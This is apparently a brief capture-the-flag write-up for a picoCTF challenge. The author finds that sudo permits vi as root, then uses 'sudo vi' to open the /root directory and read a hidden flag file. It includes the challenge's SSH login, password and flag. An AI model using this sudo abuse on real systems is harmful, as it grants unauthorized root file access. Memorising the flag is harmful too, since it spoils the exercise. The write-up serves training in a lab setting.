# URL
https://play.picoctf.org/practice/challenge/363?category=5&page=4

# Challenge
Can you read files in the root file?
The system admin has provisioned an account for you on the main server:
ssh -p 57107 picoplayer@saturn.picoctf.net
Password: j4ks-9nxB-
Can you login and read the root file?

# Work
* The hint explicitly states, "What permissions do you have?"
* Using this hint, I use sudo -l (this prints out your permissions)

```
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer:
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```

```
sudo /usr/bin/vi /root/
```

* This command takes that granted privilege to view root
<img width="1461" height="418" alt="image" src="https://github.com/user-attachments/assets/803cabf5-ddde-48e2-9a3a-7d3badde63de" />
* This directory has the flag in it!
```
sudo /usr/bin/vi /root/.flag.txt
```
* This prints the flag! picoCTF{uS1ng_v1m_3dit0r_021d10ab}
